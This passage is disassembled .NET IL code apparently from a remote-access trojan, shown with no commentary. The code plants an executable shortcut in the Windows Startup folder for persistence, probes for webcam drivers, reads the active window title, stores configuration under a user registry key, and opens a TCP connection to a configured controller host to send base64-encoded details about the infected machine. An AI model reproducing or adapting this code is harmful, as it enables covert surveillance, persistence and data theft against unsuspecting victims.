      IL_00eb:  ldnull
      IL_00ec:  ldnull
      IL_00ed:  ldnull
      IL_00ee:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00f3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00f8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00fd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0102:  stloc.1
      IL_0103:  ldloc.1
      IL_0104:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0109:  ldnull
      IL_010a:  ldstr      "TargetPath"
      IL_010f:  ldc.i4.1
      IL_0110:  newarr     [mscorlib]System.Object
      IL_0115:  stloc.3
      IL_0116:  ldloc.3
      IL_0117:  ldc.i4.0
      IL_0118:  ldc.i4.s   21
      IL_011a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_011f:  ldstr      "\\"
      IL_0124:  ldsfld     string L::RG
      IL_0129:  ldstr      ".exe"
      IL_012e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0133:  stelem.ref
      IL_0134:  ldloc.3
      IL_0135:  ldnull
      IL_0136:  ldnull
      IL_0137:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_013c:  ldloc.1
      IL_013d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0142:  ldnull
      IL_0143:  ldstr      "Save"
      IL_0148:  ldc.i4.0
      IL_0149:  newarr     [mscorlib]System.Object
      IL_014e:  ldnull
      IL_014f:  ldnull
      IL_0150:  ldnull
      IL_0151:  ldc.i4.1
      IL_0152:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0157:  pop
      IL_0158:  leave.s    IL_0168

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015a:  dup
      IL_015b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0160:  stloc.2
      IL_0161:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0166:  leave.s    IL_0168

    }  // end handler
    IL_0168:  call       void L::ko()
    IL_016d:  ret
  } // end of method L::main

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    // 
    .maxstack  8
    IL_0000:  call       void L::ED()
    IL_0005:  ret
  } // end of method L::_Lambda__2

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static string  ACT() cil managed
  {
    // 
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             string V_2,
             bool V_3,
             native int V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  call       native int L::GetForegroundWindow()
      IL_0005:  stloc.s    V_4
      IL_0007:  ldloc.s    V_4
      IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000e:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0013:  stloc.3
      IL_0014:  ldloc.3
      IL_0015:  brfalse.s  IL_0021

      IL_0017:  ldstr      ""
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0086

      IL_0021:  ldloc.s    V_4
      IL_0023:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0028:  call       int32 L::GetWindowTextLength(int64)
      IL_002d:  ldc.i4.1
      IL_002e:  add.ovf
      IL_002f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0034:  stloc.s    V_5
      IL_0036:  ldloc.s    V_4
      IL_0038:  ldloca.s   V_5
      IL_003a:  ldloc.s    V_5
      IL_003c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0041:  call       int32 L::GetWindowText(native int,
                                                  string&,
                                                  int32)
      IL_0046:  pop
      IL_0047:  ldloca.s   V_5
      IL_0049:  call       string L::ENB(string&)
      IL_004e:  stloc.2
      IL_004f:  leave.s    IL_0082

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0051:  dup
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0057:  stloc.s    V_6
      IL_0059:  ldloc.s    V_6
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0060:  ldloc.s    V_6
      IL_0062:  stloc.s    V_7
      IL_0064:  ldloc.s    V_7
      IL_0066:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006b:  ldstr      ""
      IL_0070:  stloc.2
      IL_0071:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0076:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0080:  leave.s    IL_0082

    }  // end handler
    IL_0082:  ldloc.2
    IL_0083:  stloc.1
    IL_0084:  ldloc.1
    IL_0085:  ret

    IL_0086:  ldloc.0
    IL_0087:  ret
  } // end of method L::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // 
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method L::BS

  .method public static bool  Cam() cil managed
  {
    // 
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.s    V_5
      IL_000f:  ldloca.s   V_5
      IL_0011:  ldc.i4.s   100
      IL_0013:  ldloca.s   V_2
      IL_0015:  ldc.i4.s   100
      IL_0017:  call       bool L::capGetDriverDescriptionA(int16,
                                                            string&,
                                                            int32,
                                                            string&,
                                                            int32)
      IL_001c:  brfalse.s  IL_0022

      IL_001e:  ldc.i4.1
      IL_001f:  stloc.0
      IL_0020:  leave.s    IL_004a

      IL_0022:  ldloc.1
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.1
      IL_0026:  ldloc.1
      IL_0027:  ldc.i4.4
      IL_0028:  ble.s      IL_0002

      IL_002a:  leave.s    IL_0048

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.3
      IL_0033:  ldloc.3
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  ldloc.3
      IL_003a:  stloc.s    V_4
      IL_003c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0046:  leave.s    IL_0048

    }  // end handler
    IL_0048:  ldc.i4.0
    IL_0049:  ret

    IL_004a:  ldloc.0
    IL_004b:  ret
  } // end of method L::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method public static bool  connect() cil managed
  {
    // 
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.IO.FileInfo V_13,
             string V_14,
             string[] V_15,
             string[] V_16)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool L::Cn
    IL_0006:  ldc.i4     0x7d0
    IL_000b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0010:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
    IL_0015:  stloc.1
    IL_0016:  ldloc.1
    IL_0017:  stloc.s    V_13
    IL_0019:  ldloc.s    V_13
    IL_001b:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_0020:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_0025:  brfalse.s  IL_005f

        .try
        {
          IL_0027:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
          IL_002c:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0031:  ldnull
          IL_0032:  stsfld     class [System]System.Net.Sockets.TcpClient L::FCC
          IL_0037:  leave.s    IL_005f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0039:  dup
          IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_003f:  stloc.3
          IL_0040:  ldloc.3
          IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0046:  ldloc.3
          IL_0047:  stloc.2
          IL_0048:  ldloc.2
          IL_0049:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005d:  leave.s    IL_005f

        }  // end handler
        .try
        {
          IL_005f:  ldsfld     class [mscorlib]System.IO.MemoryStream L::MeM
          IL_0064:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0069:  leave.s    IL_00c1

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_006b:  dup
          IL_006c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0071:  stloc.s    V_4
          IL_0073:  ldloc.s    V_4
          IL_0075:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_007a:  ldloc.s    V_4
          IL_007c:  stloc.s    V_5
          IL_007e:  ldloc.s    V_5
          IL_0080:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0094:  leave.s    IL_00c1

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0096:  dup
        IL_0097:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_009c:  stloc.s    V_6
        IL_009e:  ldloc.s    V_6
        IL_00a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00a5:  ldloc.s    V_6
        IL_00a7:  stloc.s    V_7
        IL_00a9:  ldloc.s    V_7
        IL_00ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00bf:  leave.s    IL_00c1

      }  // end handler
      .try
      {
        IL_00c1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_00c6:  stsfld     class [mscorlib]System.IO.MemoryStream L::MeM
        IL_00cb:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_00d0:  stsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_00d5:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_00da:  ldc.i4     0x32000
        IL_00df:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00e4:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_00e9:  ldc.i4     0x32000
        IL_00ee:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00f3:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_00f8:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00fd:  ldc.i4     0x2710
        IL_0102:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_0107:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_010c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0111:  ldc.i4     0x2710
        IL_0116:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_011b:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_0120:  ldsfld     string L::H
        IL_0125:  ldsfld     string L::P
        IL_012a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_012f:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_0134:  ldc.i4.1
        IL_0135:  stsfld     bool L::Cn
        IL_013a:  call       string L::inf()
        IL_013f:  call       bool L::Send(string)
        IL_0144:  pop
        .try
        {
          IL_0145:  ldstr      "vn"
          IL_014a:  ldstr      ""
          IL_014f:  call       object L::GTV(string,
                                             object)
          IL_0154:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0159:  ldstr      ""
          IL_015e:  ldc.i4.0
          IL_015f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_0164:  brfalse.s  IL_0180

          IL_0166:  ldloc.s    V_8
          IL_0168:  ldsflda    string L::VN
          IL_016d:  call       string L::DEB(string&)
          IL_0172:  ldstr      "\r\n"
          IL_0177:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_017c:  stloc.s    V_8
          IL_017e:  br.s       IL_01b0

          IL_0180:  ldloc.s    V_8
          IL_0182:  ldstr      "vn"
          IL_0187:  ldstr      ""
          IL_018c:  call       object L::GTV(string,
                                             object)
          IL_0191:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0196:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_019b:  stloc.s    V_14
          IL_019d:  ldloca.s   V_14
          IL_019f:  call       string L::DEB(string&)
          IL_01a4:  ldstr      "\r\n"
          IL_01a9:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01ae:  stloc.s    V_8
          IL_01b0:  ldc.i4.s   12
          IL_01b2:  newarr     [mscorlib]System.String
          IL_01b7:  stloc.s    V_16
          IL_01b9:  ldloc.s    V_16
          IL_01bb:  ldc.i4.0
          IL_01bc:  ldc.i4.5
          IL_01bd:  newarr     [mscorlib]System.String
          IL_01c2:  stloc.s    V_15
          IL_01c4:  ldloc.s    V_15
          IL_01c6:  ldc.i4.0
          IL_01c7:  ldloc.s    V_8
          IL_01c9:  stelem.ref
          IL_01ca:  ldloc.s    V_15
          IL_01cc:  ldc.i4.1
          IL_01cd:  ldsfld     string L::H
          IL_01d2:  stelem.ref
          IL_01d3:  ldloc.s    V_15
          IL_01d5:  ldc.i4.2
          IL_01d6:  ldstr      ":"
          IL_01db:  stelem.ref
          IL_01dc:  ldloc.s    V_15
          IL_01de:  ldc.i4.3
          IL_01df:  ldsfld     string L::P
          IL_01e4:  stelem.ref
          IL_01e5:  ldloc.s    V_15
          IL_01e7:  ldc.i4.4
          IL_01e8:  ldstr      "\r\n"
          IL_01ed:  stelem.ref
          IL_01ee:  ldloc.s    V_15
          IL_01f0:  call       string [mscorlib]System.String::Concat(string[])
          IL_01f5:  stelem.ref
          IL_01f6:  ldloc.s    V_16
          IL_01f8:  ldc.i4.1
          IL_01f9:  ldsfld     string L::DR
          IL_01fe:  stelem.ref
          IL_01ff:  ldloc.s    V_16
          IL_0201:  ldc.i4.2
          IL_0202:  ldstr      "\r\n"
          IL_0207:  stelem.ref
          IL_0208:  ldloc.s    V_16
          IL_020a:  ldc.i4.3
          IL_020b:  ldsfld     string L::EXE
          IL_0210:  stelem.ref
          IL_0211:  ldloc.s    V_16
          IL_0213:  ldc.i4.4
          IL_0214:  ldstr      "\r\n"
          IL_0219:  stelem.ref
          IL_021a:  ldloc.s    V_16
          IL_021c:  ldc.i4.5
          IL_021d:  ldsfld     bool L::Idr
          IL_0222:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0227:  stelem.ref
          IL_0228:  ldloc.s    V_16
          IL_022a:  ldc.i4.6
          IL_022b:  ldstr      "\r\n"
          IL_0230:  stelem.ref
          IL_0231:  ldloc.s    V_16
          IL_0233:  ldc.i4.7
          IL_0234:  ldsfld     bool L::IsF
          IL_0239:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_023e:  stelem.ref
          IL_023f:  ldloc.s    V_16
          IL_0241:  ldc.i4.8
          IL_0242:  ldstr      "\r\n"
          IL_0247:  stelem.ref
          IL_0248:  ldloc.s    V_16
          IL_024a:  ldc.i4.s   9
          IL_024c:  ldsfld     bool L::Isu
          IL_0251:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0256:  stelem.ref
          IL_0257:  ldloc.s    V_16
          IL_0259:  ldc.i4.s   10
          IL_025b:  ldstr      "\r\n"
          IL_0260:  stelem.ref
          IL_0261:  ldloc.s    V_16
          IL_0263:  ldc.i4.s   11
          IL_0265:  ldsfld     bool L::BD
          IL_026a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_026f:  stelem.ref
          IL_0270:  ldloc.s    V_16
          IL_0272:  call       string [mscorlib]System.String::Concat(string[])
          IL_0277:  stloc.s    V_8
          IL_0279:  ldstr      "inf"
          IL_027e:  ldsfld     string L::Y
          IL_0283:  ldloca.s   V_8
          IL_0285:  call       string L::ENB(string&)
          IL_028a:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_028f:  call       bool L::Send(string)
          IL_0294:  pop
          IL_0295:  leave.s    IL_02fb

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0297:  dup
          IL_0298:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_029d:  stloc.s    V_9
          IL_029f:  ldloc.s    V_9
          IL_02a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02a6:  ldloc.s    V_9
          IL_02a8:  stloc.s    V_10
          IL_02aa:  ldloc.s    V_10
          IL_02ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02c0:  leave.s    IL_02fb

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02c2:  dup
        IL_02c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c8:  stloc.s    V_11
        IL_02ca:  ldloc.s    V_11
        IL_02cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02d1:  ldloc.s    V_11
        IL_02d3:  stloc.s    V_12
        IL_02d5:  ldloc.s    V_12
        IL_02d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02dc:  ldc.i4.0
        IL_02dd:  stsfld     bool L::Cn
        IL_02e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02f1:  leave.s    IL_02fb

      }  // end handler
    }  // end .try
    finally
    {
      IL_02f3:  ldloc.s    V_13
      IL_02f5:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_02fa:  endfinally
    }  // end handler
    IL_02fb:  ldsfld     bool L::Cn
    IL_0300:  ret
  } // end of method L::connect

  .method public static string  DEB(string& s) cil managed
  {
    // 
    .maxstack  1
    .locals init (string V_0,
             uint8[] V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.1
    IL_0008:  ldloca.s   V_1
    IL_000a:  call       string L::BS(uint8[]&)
    IL_000f:  ret
  } // end of method L::DEB

  .method public static void  DLV(string n) cil managed
  {
    // 
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string L::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0047

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  ldloc.0
      IL_003a:  stloc.1
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0045:  leave.s    IL_0047

    }  // end handler
    IL_0047:  ret
  } // end of method L::DLV

  .method public static void  ED() cil managed
  {
    // 
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void L::pr(int32)
    IL_0006:  ret
  } // end of method L::ED

  .method public static string  ENB(string& s) cil managed
  {
    // 
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] L::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method L::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // 
    .maxstack  3
    .locals init (object V_0,
             object V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string L::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0034:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0039:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_003e:  stloc.1
      IL_003f:  leave.s    IL_0063

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0041:  dup
